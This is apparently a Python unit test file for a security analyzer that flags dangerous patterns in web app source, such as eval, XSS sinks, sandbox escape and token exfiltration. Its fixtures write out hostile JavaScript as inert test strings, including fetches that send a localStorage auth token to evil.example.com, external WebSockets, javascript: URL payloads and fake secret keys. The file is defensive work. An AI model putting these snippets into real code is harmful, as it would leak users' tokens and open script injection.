"""Unit tests for tinyagentos/code_analyzer.py.

One positive (trips the detector) and one negative (clean, does not trip)
sample per detector, plus a few tests for the analyze_app_source aggregator.

NOTE: fixtures below contain literal strings like "eval(...)" and fake
secret-shaped literals (e.g. "AKIAIOSFODNN7EXAMPLE") purely as inert text
passed to the analyzer for pattern matching -- none of it is ever executed,
and none of the "secrets" are real credentials.
"""

from __future__ import annotations

from tinyagentos.code_analyzer import (
    Finding,
    analyze_app_source,
    detect_dangerous_url_scheme,
    detect_dom_xss_sink,
    detect_eval_like,
    detect_hardcoded_secrets,
    detect_inline_event_handler_injection,
    detect_network_exfil,
    detect_postmessage_no_origin_check,
    detect_sandbox_escape,
    detect_storage_exfil,
    has_critical,
)


# --------------------------------------------------------------------------- #
# detect_eval_like
# --------------------------------------------------------------------------- #


class TestEvalLike:
    def test_eval_call_trips(self):
        findings = detect_eval_like("app.js", "eval(userInput);")
        assert len(findings) == 1
        assert findings[0].rule_id == "eval-like-execution"
        assert findings[0].severity == "critical"

    def test_new_function_trips(self):
        findings = detect_eval_like("app.js", "const f = new Function('return 1');")
        assert len(findings) == 1

    def test_settimeout_string_trips(self):
        findings = detect_eval_like("app.js", 'setTimeout("doEvil()", 100);')
        assert len(findings) == 1

    def test_clean_code_does_not_trip(self):
        content = (
            "function evaluate(x) { return x * 2; }\n"
            "mathObj.eval(expr);\n"
            "setTimeout(doSomething, 100);\n"
        )
        assert detect_eval_like("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_network_exfil
# --------------------------------------------------------------------------- #


class TestNetworkExfil:
    def test_absolute_fetch_trips(self):
        findings = detect_network_exfil("app.js", 'fetch("https://evil.example.com/steal");')
        assert len(findings) == 1
        assert findings[0].rule_id == "network-exfil"
        assert findings[0].severity == "critical"

    def test_websocket_to_external_host_trips(self):
        findings = detect_network_exfil("app.js", 'new WebSocket("wss://evil.example.com/ws");')
        assert len(findings) == 1

    def test_relative_fetch_does_not_trip(self):
        content = 'fetch("/api/userspace-apps/test-app/broker");'
        assert detect_network_exfil("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_dom_xss_sink
# --------------------------------------------------------------------------- #


class TestDomXssSink:
    def test_dynamic_innerhtml_trips(self):
        findings = detect_dom_xss_sink("app.js", 'el.innerHTML = "<b>" + userInput + "</b>";')
        assert len(findings) == 1
        assert findings[0].rule_id == "dom-xss-sink"
        assert findings[0].severity == "critical"

    def test_document_write_with_concat_trips(self):
        findings = detect_dom_xss_sink("app.js", 'document.write("<p>" + name + "</p>")')
        assert len(findings) == 1

    def test_static_innerhtml_does_not_trip(self):
        content = 'el.innerHTML = "<b>Static text</b>";'
        assert detect_dom_xss_sink("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_dangerous_url_scheme
# --------------------------------------------------------------------------- #


class TestDangerousUrlScheme:
    def test_javascript_scheme_trips(self):
        findings = detect_dangerous_url_scheme("app.js", 'const link = "javascript:alert(1)";')
        assert len(findings) == 1
        assert findings[0].rule_id == "dangerous-url-scheme"
        assert findings[0].severity == "critical"

    def test_data_text_html_scheme_trips(self):
        findings = detect_dangerous_url_scheme(
            "app.js", 'frame.src = "data:text/html,<script>alert(1)</script>";'
        )
        assert len(findings) == 1

    def test_normal_url_does_not_trip(self):
        content = 'const link = "https://example.com";'
        assert detect_dangerous_url_scheme("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_inline_event_handler_injection
# --------------------------------------------------------------------------- #


class TestInlineEventHandlerInjection:
    def test_set_attribute_on_handler_trips(self):
        findings = detect_inline_event_handler_injection(
            "app.js", 'btn.setAttribute("onclick", handlerCode);'
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "inline-event-handler-injection"
        assert findings[0].severity == "critical"

    def test_interpolated_inline_handler_trips(self):
        content = 'const html = `<button onclick="alert(${msg})">Click</button>`;'
        findings = detect_inline_event_handler_injection("app.js", content)
        assert len(findings) == 1

    def test_static_inline_handler_does_not_trip(self):
        content = "const html = '<button onclick=\"doThing()\">Click</button>';"
        assert detect_inline_event_handler_injection("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_hardcoded_secrets
# --------------------------------------------------------------------------- #


class TestHardcodedSecrets:
    def test_aws_key_trips(self):
        findings = detect_hardcoded_secrets("app.js", 'const key = "AKIAIOSFODNN7EXAMPLE";')
        assert len(findings) == 1
        assert findings[0].rule_id == "hardcoded-secret"
        assert findings[0].severity == "critical"

    def test_generic_api_key_assignment_trips(self):
        findings = detect_hardcoded_secrets(
            "app.js", 'const apiKey = "sk_live_abcdef1234567890ZZ";'
        )
        assert len(findings) == 1

    def test_plain_text_mention_does_not_trip(self):
        content = 'const message = "please enter your api key in settings";'
        assert detect_hardcoded_secrets("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_sandbox_escape
# --------------------------------------------------------------------------- #


class TestSandboxEscape:
    def test_window_top_access_trips(self):
        findings = detect_sandbox_escape("app.js", 'window.top.location = "http://evil.example.com";')
        assert len(findings) == 1
        assert findings[0].rule_id == "sandbox-escape-attempt"
        assert findings[0].severity == "critical"

    def test_window_parent_access_trips(self):
        findings = detect_sandbox_escape("app.js", "window.parent.postMessage(data, '*');")
        assert len(findings) == 1

    def test_unrelated_local_variable_does_not_trip(self):
        content = "const parent = getParentElement();\nconsole.log(parent.id);\n"
        assert detect_sandbox_escape("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_postmessage_no_origin_check
# --------------------------------------------------------------------------- #


class TestPostMessageNoOriginCheck:
    def test_wildcard_target_origin_trips(self):
        findings = detect_postmessage_no_origin_check(
            "app.js", 'otherWindow.postMessage(data, "*");'
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "postmessage-no-origin-check"
        assert findings[0].severity == "critical"

    def test_listener_without_origin_check_trips(self):
        content = (
            'window.addEventListener("message", function(event) {\n'
            "  doSomething(event.data);\n"
            "});\n"
        )
        findings = detect_postmessage_no_origin_check("app.js", content)
        assert len(findings) == 1

    def test_listener_with_origin_check_does_not_trip(self):
        content = (
            'window.addEventListener("message", function(event) {\n'
            '  if (event.origin !== "https://trusted.example.com") return;\n'
            "  doSomething(event.data);\n"
            "});\n"
        )
        assert detect_postmessage_no_origin_check("app.js", content) == []


# --------------------------------------------------------------------------- #
# detect_storage_exfil
# --------------------------------------------------------------------------- #


class TestStorageExfil:
    def test_storage_read_near_network_call_trips(self):
        content = (
            'const token = localStorage.getItem("authToken");\n'
            'fetch("https://evil.example.com/collect?t=" + token);\n'
        )
        findings = detect_storage_exfil("app.js", content)
        assert len(findings) == 1
        assert findings[0].rule_id == "storage-exfil"
        assert findings[0].severity == "critical"

    def test_storage_read_without_network_call_does_not_trip(self):
        content = (
            'const token = localStorage.getItem("authToken");\n'
            "console.log(token);\n"
        )
        assert detect_storage_exfil("app.js", content) == []


# --------------------------------------------------------------------------- #
# analyze_app_source aggregation
# --------------------------------------------------------------------------- #


class TestAnalyzeAppSource:
    def test_empty_files_returns_no_findings(self):
        assert analyze_app_source({}) == []

    def test_clean_app_returns_no_findings(self):
        files = {
            "index.html": "<html><body><h1>Hello</h1></body></html>",
            "app.js": 'console.log("hello world");',
            "style.css": "body { margin: 0; }",
        }
        assert analyze_app_source(files) == []

    def test_multiple_files_are_all_scanned(self):
        files = {
            "index.html": "<html></html>",
            "app.js": "eval(userInput);",
        }
        findings = analyze_app_source(files)
        assert len(findings) == 1
        assert findings[0].file == "app.js"

    def test_has_critical_true_when_critical_present(self):
        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
        assert has_critical(findings) is True

    def test_has_critical_false_when_only_warnings(self):
        findings = [Finding("warning", "some-rule", "app.js", 1, "msg")]
        assert has_critical(findings) is False

    def test_finding_to_dict_shape(self):
        f = Finding("critical", "eval-like-execution", "app.js", 3, "msg")
        d = f.to_dict()
        assert d == {
            "severity": "critical",
            "rule_id": "eval-like-execution",
            "file": "app.js",
            "line": 3,
            "message": "msg",
        }
